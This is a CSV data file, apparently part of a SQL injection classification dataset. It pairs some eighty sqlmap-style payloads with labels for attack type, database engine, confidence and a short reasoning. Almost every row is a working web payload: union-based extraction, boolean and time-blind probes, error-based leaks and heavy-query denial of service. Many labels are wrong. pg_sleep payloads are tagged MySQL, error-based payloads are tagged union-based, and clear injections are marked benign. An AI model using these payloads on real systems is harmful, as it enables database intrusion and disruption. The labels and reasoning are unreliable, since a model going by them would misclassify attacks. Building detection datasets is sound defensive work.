id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
118,1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
119,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) # irvm",time_blind,mysql,0.9,'benchmark()' function detected; used in MySQL to create time delays for blind injection.,2
120,"1 ) as ooex where 1087 = 1087 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
121,end and ( ( 'vcaf' like 'vcaf,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,2
122,"1%"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,"'generate_series' with a large range (5,000,000) creates a massive result set for heavy query DoS.",3
123,"1"" ) ) as esho where 8864 = 8864 order by 1--",benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
124,"-4280%"" ) ) ) union all select 7981,7981--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
125,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) +'",benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
126,1'+ ( select 'fqkk' where 9725 = 9725,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
127,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,0.9,'benchmark()' function detected; used in MySQL to create time delays for blind injection.,2
128,"1"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,1
129,"-1072%"" ) ) or 3090 = 3539",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
130,"-9574' ) as rxym where 4719 = 4719 union all select 4719,4719,4719,4719,4719,4719,4719--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
131,"-8833' ) ) union all select 3227,3227,3227,3227,3227--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
132,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",time_blind,oracle,0.9,'dbms_pipe.receive_message' is an Oracle-specific function often used for time-based blind injection.,3
133,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'zfrs' = 'zfrs",boolean_blind,db2,0.9,DB2 metadata table 'sysibm.systables' used for schema discovery in boolean-blind injection.,3
134,1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
135,end and ( ( ( 3673 = 3673,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,2
136,"-4637"" where 8354 = 8354 or 1186 = 2714--",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
137,end# ckxq,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",3
138,1'+ ( select ejaj where 1651 = 1651 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
139,"-9558"" ) ) ) union all select 2935,2935,2935,2935,2935--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
140,"1' ) union all select null,null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
141,"1%' ) ) union all select null,null,null,null,null,null--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
142,"1"" ) ) as vtad where 3653 = 3653 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",time_blind,mysql,0.9,'benchmark()' function detected; used in MySQL to create time delays for blind injection.,1
143,1'|| ( select 'mobv' from dual where 6338 = 6338,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
144,"-2964"" ) ) order by 1--",benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",3
145,"-9208%"" ) ) or 8571 = 8571--",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
146,"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
147,( select ( case when ( 6838 = 2866 ) then 6838 else 1/ ( select 0 ) end ) ),benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
148,"-5866' ) ) as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
149,"-4168' ) union all select 2618,2618#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
150,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'odsl' like 'odsl,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
151,"1'|| ( select 'votg' where 5105 = 5105 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,"'generate_series' with a large range (5,000,000) creates a massive result set for heavy query DoS.",3
152,"1 where 1062 = 1062 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
153,1 ) where 1096 = 1096,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
154,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 5220 = 5220",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",1
155,"1%' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( '%' = '",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
156,"1' ) as wnys where 6457 = 6457 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,'benchmark()' function detected; used in MySQL to create time delays for blind injection.,2
157,"1"" ) as eefe where 5290 = 5290 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
158,"1 and make_set ( 8403 = 8403,8899 ) # zysq",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: 1 and make_set ( 840...,2
159,"1' ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
160,-4428 ) or 3038 = 3038,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
161,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'odkr' = 'odkr",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
162,"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.9,'extractvalue()' is a MySQL function used to trigger XPath errors in error-based SQLi.,1
163,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""xwnw"" = ""xwnw",boolean_blind,firebird,0.9,Firebird metadata table 'rdb$database' or 'rdb$fields' used in boolean-based blind injection.,3
164,1%' ) rlike ( select ( case when ( 1210 = 8664 ) then 1 else 0x28 end ) ) and ( '%' = ',boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: 1%' ) rlike ( select...,3
165,1' ) where 1424 = 1424 and sleep ( 5 ) --,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
166,"-6906' where 1839 = 1839 union all select 1839,1839,1839,1839,1839--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
167,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,1
168,"1%' union all select null,null,null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
169,"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,'dbms_pipe.receive_message' is an Oracle-specific function often used for time-based blind injection.,3
170,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",1
171,"1'+ ( select 'ovti' where 4243 = 4243 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) +'",time_blind,oracle,0.9,'dbms_pipe.receive_message' is an Oracle-specific function often used for time-based blind injection.,3
172,1'|| ( select 'awic' where 5227 = 5227,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
173,1' ) ) ) or sleep ( 5 ) #,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
174,"-8327 where 7555 = 7555 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",error_based,mssql,0.9,"Type conversion error (e.g., 'convert(int, ...)') used to leak data in error-based SQLi.",1
175,-5229' ) ) as tkqp where 9253 = 9253 or 9323 = 9323#,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
176,1' where 8482 = 8482 or sleep ( 5 ) #,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
177,"1' in boolean mode ) union all select null,null,null,null,null,null,null--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
178,"1%"" ) ) and 8316 = 6410#",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
179,"1'+ ( select zfpk where 9784 = 9784 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
180,select ( case when ( 3325 = 1767 ) then 3325 else 3325* ( select 3325 from mysql.db ) end ) #,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
181,"1 ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
182,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
183,1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
184,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'cgou' like 'cgou",time_blind,oracle,0.9,'dbms_pipe.receive_message' is an Oracle-specific function often used for time-based blind injection.,3
185,1 ) ) ) and 9575 = 1640--,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
186,"-3963"" or 1224 = 5119",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
187,"1"" ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.9,Firebird metadata table 'rdb$database' or 'rdb$fields' used in boolean-based blind injection.,3
188,1'+ ( select ukwc where 3008 = 3008 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
189,"1"" where 2483 = 2483",benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
190,"-6442"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
191,1%' and ( 2439 = 2555 ) *2555 and '%' = ',boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,2
192,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""kbex"" like ""kbex",boolean_blind,firebird,0.9,Firebird metadata table 'rdb$database' or 'rdb$fields' used in boolean-based blind injection.,3
193,"1' where 9420 = 9420 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.9,DB2 metadata table 'sysibm.systables' used for schema discovery in boolean-blind injection.,3
194,"-8215%"" ) union all select 3877,3877,3877,3877,3877,3877--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
195,"-7069 ) union all select 6638,6638,6638,6638,6638,6638--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
196,select ( case when ( 8234 = 2498 ) then 8234 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,error_based,generic,0.9,"Type conversion error (e.g., 'convert(int, ...)') used to leak data in error-based SQLi.",1
197,1' ) where 2120 = 2120,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
198,"iif ( 1878 = 2513,1,1/0 )",boolean_blind,mssql,0.9,'iif()' with a division by zero ('1/0') used to trigger conditional errors in boolean-blind SQLi.,1
199,"1%"" ) ) ) union all select null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
200,1 ) and sleep ( 5 ) and ( 4855 = 4855,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
